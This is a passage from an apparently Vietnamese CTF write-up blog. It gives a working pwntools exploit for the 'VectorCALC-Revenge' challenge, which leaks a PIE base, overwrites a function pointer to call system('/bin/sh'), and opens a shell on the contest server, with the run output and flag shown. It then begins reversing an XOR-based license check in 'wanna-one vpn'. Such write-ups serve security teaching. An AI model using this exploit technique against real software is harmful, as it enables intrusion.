<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">0x558c6065298c</span> <span style="color:#f92672">&lt;</span>main<span style="color:#f92672">+</span><span style="color:#ae81ff">173</span><span style="color:#f92672">&gt;</span>    call   rdx                           <span style="color:#f92672">&lt;</span>w1n<span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>        rdi: <span style="color:#ae81ff">0x558c60655030</span> (stdin<span style="color:#960050;background-color:#1e0010">@</span>GLIBC_2<span style="color:#ae81ff">.2.5</span>) <span style="color:#960050;background-color:#1e0010"></span> <span style="color:#ae81ff">0x7fdff7ff6aa0</span> (_IO_2_1_stdin_) <span style="color:#960050;background-color:#1e0010"></span> <span style="color:#ae81ff">0xfbad208b</span>
</span></span><span style="display:flex;"><span>        rsi: <span style="color:#ae81ff">0x3</span>
</span></span><span style="display:flex;"><span>        rdx: <span style="color:#ae81ff">0x558c606529d2</span> (w1n) <span style="color:#960050;background-color:#1e0010"></span> endbr64 
</span></span><span style="display:flex;"><span>        rcx: <span style="color:#ae81ff">0x0</span>
</span></span></code></pre></div><p>Lc ny chng ta cn iu khin thanh ghi <code>rdi</code> tr n chui <code>/bin/sh\0</code> l c. Lc gi con tr hm <code>((struct Vector *)sum)-&gt;printFunc(sum)</code> tham s ca chng ta l bin <code>sum</code>.</p>
<p>M <code>sum</code> lc ny ang tr n <code>v_list-16</code>, do  <code>rdi</code> chnh xc ang tr n <code>0x558c60655030 (stdin@GLIBC_2.2.5)</code> nh trn hnh</p>
<p>iu chng ta mun by gi chnh l <code>rdi-&gt;/bin/sh </code> , <code>rdx-&gt; w1n</code></p>
<p>-&gt; Kh l d dng v ta ch cn ghi vo 2 chunk trn v_list , ch s y ca chunk ny s l <code>/bin/sh</code>, ch s x ca chunk k tip s l a ch hm <code>w1n</code> (cch chnh xc 16 bytes), ta sa sum thnh a ch <code>/bin/sh</code> l s c c shell</p>
<p>Mi chuyn  r rng, ta bt u thc hnh:</p>
<p>Mnh chnh sa offset hm w1n ngay ch thc hin <code>call system</code>  trnh thanh ghi <code>rdi</code> c set cho gi tr rc</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">00</span><span style="color:#f92672">:</span><span style="color:#ae81ff">0000</span><span style="color:#960050;background-color:#1e0010"></span>         <span style="color:#ae81ff">0x563e7ff31040</span> (v_list) <span style="color:#960050;background-color:#1e0010"></span> <span style="color:#ae81ff">0x68732f6e69622f</span> <span style="color:#75715e">/* &#39;/bin/sh&#39; */</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">01</span><span style="color:#f92672">:</span><span style="color:#ae81ff">000</span><span style="color:#ae81ff">8</span><span style="color:#960050;background-color:#1e0010"></span> rax rdi <span style="color:#ae81ff">0x563e7ff31048</span> (v_list<span style="color:#f92672">+</span><span style="color:#ae81ff">8</span>) <span style="color:#960050;background-color:#1e0010"></span> <span style="color:#ae81ff">0x68732f6e69622f</span> <span style="color:#75715e">/* &#39;/bin/sh&#39; */</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">02</span><span style="color:#f92672">:</span><span style="color:#ae81ff">0010</span><span style="color:#960050;background-color:#1e0010"></span>         <span style="color:#ae81ff">0x563e7ff31050</span> (v_list<span style="color:#f92672">+</span><span style="color:#ae81ff">16</span>) <span style="color:#960050;background-color:#1e0010"></span> <span style="color:#ae81ff">0x563e7ff2e35d</span> (printData) <span style="color:#960050;background-color:#1e0010"></span> endbr64 
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">03</span><span style="color:#f92672">:</span><span style="color:#ae81ff">001</span><span style="color:#ae81ff">8</span><span style="color:#960050;background-color:#1e0010"></span>         <span style="color:#ae81ff">0x563e7ff31058</span> (v_list<span style="color:#f92672">+</span><span style="color:#ae81ff">24</span>) <span style="color:#960050;background-color:#1e0010"></span> <span style="color:#ae81ff">0x563e7ff2e9e4</span> (w1n<span style="color:#f92672">+</span><span style="color:#ae81ff">18</span>) <span style="color:#960050;background-color:#1e0010"></span> call <span style="color:#ae81ff">0x563e7ff2e100</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">04</span><span style="color:#f92672">:</span><span style="color:#ae81ff">0020</span><span style="color:#960050;background-color:#1e0010"></span>         <span style="color:#ae81ff">0x563e7ff31060</span> (v_list<span style="color:#f92672">+</span><span style="color:#ae81ff">32</span>) <span style="color:#960050;background-color:#1e0010"></span> <span style="color:#ae81ff">0x563e7ff2e9e4</span> (w1n<span style="color:#f92672">+</span><span style="color:#ae81ff">18</span>) <span style="color:#960050;background-color:#1e0010"></span> call <span style="color:#ae81ff">0x563e7ff2e100</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">05</span><span style="color:#f92672">:</span><span style="color:#ae81ff">002</span><span style="color:#ae81ff">8</span><span style="color:#960050;background-color:#1e0010"></span>         <span style="color:#ae81ff">0x563e7ff31068</span> (v_list<span style="color:#f92672">+</span><span style="color:#ae81ff">40</span>) <span style="color:#960050;background-color:#1e0010"></span> <span style="color:#ae81ff">0x563e7ff2e35d</span> (printData) <span style="color:#960050;background-color:#1e0010"></span> endbr64 
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">06</span><span style="color:#f92672">:</span><span style="color:#ae81ff">0030</span><span style="color:#960050;background-color:#1e0010"></span>         <span style="color:#ae81ff">0x563e7ff31070</span> (v_list<span style="color:#f92672">+</span><span style="color:#ae81ff">48</span>) <span style="color:#960050;background-color:#1e0010"></span> <span style="color:#ae81ff">0x4</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">07</span><span style="color:#f92672">:</span><span style="color:#ae81ff">003</span><span style="color:#ae81ff">8</span><span style="color:#960050;background-color:#1e0010"></span>         <span style="color:#ae81ff">0x563e7ff31078</span> (v_list<span style="color:#f92672">+</span><span style="color:#ae81ff">56</span>) <span style="color:#960050;background-color:#1e0010"></span> <span style="color:#ae81ff">0x4</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">08</span><span style="color:#f92672">:</span><span style="color:#ae81ff">0040</span><span style="color:#960050;background-color:#1e0010"></span>         <span style="color:#ae81ff">0x563e7ff31080</span> (v_list<span style="color:#f92672">+</span><span style="color:#ae81ff">64</span>) <span style="color:#960050;background-color:#1e0010"></span> <span style="color:#ae81ff">0x563e7ff2e35d</span> (printData) <span style="color:#960050;background-color:#1e0010"></span> endbr64 
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">09</span><span style="color:#f92672">:</span><span style="color:#ae81ff">004</span><span style="color:#ae81ff">8</span><span style="color:#960050;background-color:#1e0010"></span>         <span style="color:#ae81ff">0x563e7ff31088</span> (sum) <span style="color:#960050;background-color:#1e0010"></span> <span style="color:#ae81ff">0x563e7ff31048</span> (v_list<span style="color:#f92672">+</span><span style="color:#ae81ff">8</span>) <span style="color:#960050;background-color:#1e0010"></span> <span style="color:#ae81ff">0x68732f6e69622f</span> <span style="color:#75715e">/* &#39;/bin/sh&#39;
</span></span></span></code></pre></div><p>Vy <code>sum -&gt; v_list+8</code>, khi gi con tr hm th <code>v_list+24-&gt;w1n</code> s c gi, vi <code>sum</code> ang cha a ch chui <code>/bin/sh</code></p>
<p>-&gt; Nhng khng thnh cng c c shell v b stack alignment c local v remote</p>
<p>-&gt; Mnh th thay th bng <code>system.plt</code> th khng dnh stack aligment v thnh cng chim c shell</p>
<p>Sau y l script exploit ca mnh
Vector Exploit:
<a href="https://github.com/w1n-gl0ry/CTF/blob/main/2023/miniCTF/pwn/VectorCALC-Revenge/xpl.py">xpl.py</a></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#context.log_level=&#39;debug&#39;</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#io=process(&#39;./chall_revenge&#39;)</span>
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">=</span>remote(<span style="color:#e6db74">&#39;45.122.249.68&#39;</span>, <span style="color:#ae81ff">20018</span>)
</span></span><span style="display:flex;"><span>elf<span style="color:#f92672">=</span>context<span style="color:#f92672">.</span>binary<span style="color:#f92672">=</span>ELF(<span style="color:#e6db74">&#39;./chall_revenge&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#gdb.attach(io)</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">enter</span>(idx, x, y):
</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&gt; &#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;1&#39;</span>)
</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Index: &#39;</span>, idx)
</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Enter x: &#39;</span>, x)
</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Enter y: &#39;</span>, y)
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">sumVector</span>(idx):
</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&gt; &#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;2&#39;</span>)
</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Save the sum to index: &#39;</span>, idx)
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">printsum</span>():
</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&gt; &#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;3&#39;</span>)
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">loadfav</span>(idx):
</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&gt; &#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;4&#39;</span>)
</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Index&#39;</span>, idx)
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">printfav</span>(idx):
</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&gt; &#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;5&#39;</span>)
</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Index&#39;</span>, idx)
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">addfav</span>(idx):
</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&gt; &#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;6&#39;</span>)
</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Index&#39;</span>, idx)
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>enter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;0&#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;1&#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;1&#39;</span>)
</span></span><span style="display:flex;"><span>enter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;1&#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;1&#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;1&#39;</span>)
</span></span><span style="display:flex;"><span>enter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;2&#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;1&#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;1&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>sumVector(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;2&#39;</span>)
</span></span><span style="display:flex;"><span>loadfav(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;2&#39;</span>)
</span></span><span style="display:flex;"><span>printfav(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;2&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;v = [&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>leak<span style="color:#f92672">=</span>io<span style="color:#f92672">.</span>recvline()<span style="color:#f92672">.</span>strip(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;]</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>)<span style="color:#f92672">.</span>split()
</span></span><span style="display:flex;"><span><span style="color:#75715e"># print(leak)</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>pie<span style="color:#f92672">=</span>int(leak[<span style="color:#ae81ff">0</span>])<span style="color:#f92672">-</span><span style="color:#ae81ff">0x35d</span>
</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#39;pie_base :&#39;</span> <span style="color:#f92672">+</span> hex(pie))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>v_list<span style="color:#f92672">=</span>int(leak[<span style="color:#ae81ff">1</span>])<span style="color:#f92672">-</span><span style="color:#ae81ff">48</span>
</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#39;v_list array :&#39;</span> <span style="color:#f92672">+</span> hex(v_list))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>sum<span style="color:#f92672">=</span>v_list<span style="color:#f92672">+</span><span style="color:#ae81ff">64</span>
</span></span><span style="display:flex;"><span>faves<span style="color:#f92672">=</span>sum<span style="color:#f92672">+</span><span style="color:#ae81ff">0x18</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#39;sum :&#39;</span> <span style="color:#f92672">+</span> hex(sum))
</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#39;faves :&#39;</span> <span style="color:#f92672">+</span> hex(faves))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>w1n<span style="color:#f92672">=</span>pie<span style="color:#f92672">+</span><span style="color:#ae81ff">0x0000000000009E4</span>
</span></span><span style="display:flex;"><span>system<span style="color:#f92672">=</span>pie<span style="color:#f92672">+</span><span style="color:#ae81ff">0x100</span>
</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#39;w1n :&#39;</span> <span style="color:#f92672">+</span> hex(w1n))
</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#39;system :&#39;</span> <span style="color:#f92672">+</span> hex(system))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>bin_sh<span style="color:#f92672">=</span><span style="color:#ae81ff">0x68732f6e69622f</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>enter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;0&#39;</span>, str(bin_sh)<span style="color:#f92672">.</span>encode(), str(bin_sh)<span style="color:#f92672">.</span>encode())
</span></span><span style="display:flex;"><span>enter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;3&#39;</span>,str(v_list<span style="color:#f92672">+</span><span style="color:#ae81ff">8</span>)<span style="color:#f92672">.</span>encode(), str(v_list<span style="color:#f92672">+</span><span style="color:#ae81ff">8</span>)<span style="color:#f92672">.</span>encode())
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># enter(b&#39;1&#39;, str(w1n).encode(), str(w1n).encode())</span>
</span></span><span style="display:flex;"><span>enter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;1&#39;</span>, str(system)<span style="color:#f92672">.</span>encode(), str(system)<span style="color:#f92672">.</span>encode())
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>printsum()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>interactive()
</span></span></code></pre></div><p>spawn shell &amp; get flag:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>   ~/CTF/wannagame/calc/revenge                                                                                                               02:51:19 
</span></span><span style="display:flex;"><span> python3 xpl.py                                                                                                                                          
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Opening connection to 45.122.249.68 on port 20018: Done
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> <span style="color:#e6db74">&#39;/home/w1n-gl0ry/CTF/wannagame/calc/revenge/chall_revenge&#39;</span>
</span></span><span style="display:flex;"><span>    Arch:     amd64-64-little
</span></span><span style="display:flex;"><span>    RELRO:    Full RELRO
</span></span><span style="display:flex;"><span>    Stack:    Canary found
</span></span><span style="display:flex;"><span>    NX:       NX enabled
</span></span><span style="display:flex;"><span>    PIE:      PIE enabled
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> pie_base :0x56172c10e000
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> v_list array :0x56172c111040
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> sum :0x56172c111080
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> faves :0x56172c111098
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> w1n :0x56172c10e9e4
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> system :0x56172c10e100
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Switching to interactive mode
</span></span><span style="display:flex;"><span>$ id
</span></span><span style="display:flex;"><span>uid<span style="color:#f92672">=</span>1001<span style="color:#f92672">(</span>user_revenge<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>1001<span style="color:#f92672">(</span>user_revenge<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>1001<span style="color:#f92672">(</span>user_revenge<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>$ cd /home/user_revenge
</span></span><span style="display:flex;"><span>$ ls
</span></span><span style="display:flex;"><span>chall_revenge
</span></span><span style="display:flex;"><span>flag-769f85d66029625591d2e6b1bf75c5864b134b2901fa1ef5cf49c2eece7da15a.txt
</span></span><span style="display:flex;"><span>$ cat flag-769f85d66029625591d2e6b1bf75c5864b134b2901fa1ef5cf49c2eece7da15a.txt
</span></span><span style="display:flex;"><span>W1<span style="color:#f92672">{</span>g00d_exploit_idea!!!<span style="color:#f92672">}</span>
</span></span></code></pre></div><p>-&gt; <code>FLAG: W1{g00d_exploit_idea!!!}</code></p>
<h1 id="reverse">Reverse</h1>
<h2 id="wanna-one-vpn">wanna-one vpn</h2>
<p><code>Description: wanna-one private vpn needs a license key to be authorized, help me intrude their system and I will pay you a fair price!</code></p>
<p><code>Chall file:</code> <a href="https://github.com/w1n-gl0ry/CTF/blob/main/2023/miniCTF/rev/wannaone-vpn/wanna-one-vpn">wanna-one-vpn</a></p>
<pre tabindex="0"><code>   ~/CTF/wannagame/chall                                                           18:49:19 
 file wanna-one-vpn                                                                           
wanna-one-vpn: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=bd291b1ebb7737ffcb8d0712dc093d58183f6faf, for GNU/Linux 3.2.0, not stripped
</code></pre><p>V y l file ELF 64 bit (khng b stripped) nn mnh load vo IDA  tin hnh dch ngc</p>
<p>Nhn lt qua assembly th mnh thy chng trnh load vo 1 mng <code>encrypted_flag</code>, nhn <code>input</code> ta nhp vo ri so snh  di 2 mng bng hm <code>strlen()</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>.text:<span style="color:#ae81ff">000000000000135</span>B                 mov     eax, [rbp<span style="color:#f92672">+</span>var_200044]
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">0000000000001361</span>                 sub     eax, <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">0000000000001364</span>                 cdqe
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">0000000000001366</span>                 mov     byte ptr [rbp<span style="color:#f92672">+</span>rax<span style="color:#f92672">+</span>buf], <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">000000000000136</span>E                 lea     rax, [rbp<span style="color:#f92672">+</span>buf]
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">0000000000001375</span>                 mov     rdi, rax        ; s
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">000000000000137</span><span style="color:#ae81ff">8</span>                 call    _strlen
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">000000000000137</span>D                 mov     rbx, rax
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">00000000000013</span><span style="color:#ae81ff">80</span>                 mov     rax, cs:encrypted_flag     <span style="color:#f92672">-&gt;</span> mng gm cc k t cho trc
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">00000000000013</span><span style="color:#ae81ff">87</span>                 mov     rdi, rax        ; s
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">00000000000013</span><span style="color:#ae81ff">8</span>A                 call    _strlen
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">000000000000138F</span>                 cmp     rbx, rax
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">00000000000013</span><span style="color:#ae81ff">92</span>                 jz      <span style="color:#66d9ef">short</span> loc_13B2
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">00000000000013</span><span style="color:#ae81ff">94</span>                 lea     rax, aInvalidLicense ; <span style="color:#e6db74">&#34;Invalid license key!&#34;</span>
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">00000000000013</span><span style="color:#ae81ff">9</span>B                 mov     rdi, rax        ; format
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">00000000000013</span><span style="color:#ae81ff">9</span>E                 mov     eax, <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">00000000000013</span>A3                 call    _printf
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">00000000000013</span>A8                 mov     edi, <span style="color:#ae81ff">1</span>          ; status
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">00000000000013</span>AD                 call    _exit
</span></span></code></pre></div><p>Vy ta phi nhp vo 1 mng c kch thc nh <code>encrypted_flag</code> 24 k t</p>
<p><code>.rodata:0000000000002004 a8rq9VdVyesv9Em db '^8rq9{Vd:VyesV~9|emVph6t',0</code></p>
<p>Tip tc, chng trnh thc hin 1 s hnh ng m mnh c th d dng dch ra c:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>.text:<span style="color:#ae81ff">00000000000013</span>BE loc_13BE:                               ; CODE XREF: main<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>BC<span style="color:#960050;background-color:#1e0010"></span>j
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">00000000000013</span>BE                 mov     rdx, cs:encrypted_flag
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">00000000000013</span>C5                 mov     eax, [rbp<span style="color:#f92672">+</span>var_200048]
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">00000000000013</span>CB                 cdqe
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">00000000000013</span>CD                 add     rax, rdx
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">00000000000013</span>D0                 movzx   edx, byte ptr [rax]
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">00000000000013</span>D3                 mov     eax, [rbp<span style="color:#f92672">+</span>var_200048]
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">00000000000013</span>D9                 cdqe
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">00000000000013</span>DB                 movzx   eax, byte ptr [rbp<span style="color:#f92672">+</span>rax<span style="color:#f92672">+</span>buf]
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">00000000000013E3</span>                 xor     eax, <span style="color:#ae81ff">9</span>
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">00000000000013E6</span>                 cmp     dl, al
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">00000000000013E8</span>                 jz      <span style="color:#66d9ef">short</span> loc_1408
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">00000000000013</span>EA                 lea     rax, aInvalidLicense ; <span style="color:#e6db74">&#34;Invalid license key!&#34;</span>
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">00000000000013F</span><span style="color:#ae81ff">1</span>                 mov     rdi, rax        ; format
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">00000000000013F</span><span style="color:#ae81ff">4</span>                 mov     eax, <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">00000000000013F</span><span style="color:#ae81ff">9</span>                 call    _printf
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">00000000000013F</span>E                 mov     edi, <span style="color:#ae81ff">1</span>          ; status
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">0000000000001403</span>                 call    _exit
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">000000000000140</span><span style="color:#ae81ff">8</span> ; <span style="color:#f92672">---------------------------------------------------------------------------</span>
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">000000000000140</span><span style="color:#ae81ff">8</span>
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">000000000000140</span><span style="color:#ae81ff">8</span> loc_1408:                               ; CODE XREF: main<span style="color:#f92672">+</span><span style="color:#ae81ff">17</span>A<span style="color:#960050;background-color:#1e0010"></span>j
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">000000000000140</span><span style="color:#ae81ff">8</span>                 add     [rbp<span style="color:#f92672">+</span>var_200048], <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">000000000000140F</span>
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">000000000000140F</span> loc_140F:                               ; CODE XREF: main<span style="color:#f92672">+</span><span style="color:#ae81ff">14</span>E<span style="color:#960050;background-color:#1e0010"></span>j
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">000000000000140F</span>                 mov     eax, [rbp<span style="color:#f92672">+</span>var_200048]
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">0000000000001415</span>                 movsxd  rbx, eax
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">000000000000141</span><span style="color:#ae81ff">8</span>                 mov     rax, cs:encrypted_flag
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">000000000000141F</span>                 mov     rdi, rax        ; s
</span></span></code></pre></div><p>Chng trnh lu tng byte ca mng <code>encrypted_flag</code> vo thanh ghi edx, mng ca chng ta nhp vo cng c load qua eax, ri sau  thc hin php xor vi 9. Cui cng kim tra 2 k t c ging nhau khng ?</p>
<p>n y  r rng ri, mnh dng code python n gin sau  m phng li thut ton trn.</p>
<p><a href="https://github.com/w1n-gl0ry/CTF/blob/main/2023/miniCTF/rev/wannaone-vpn/vpn.py">vpn.py</a></p>
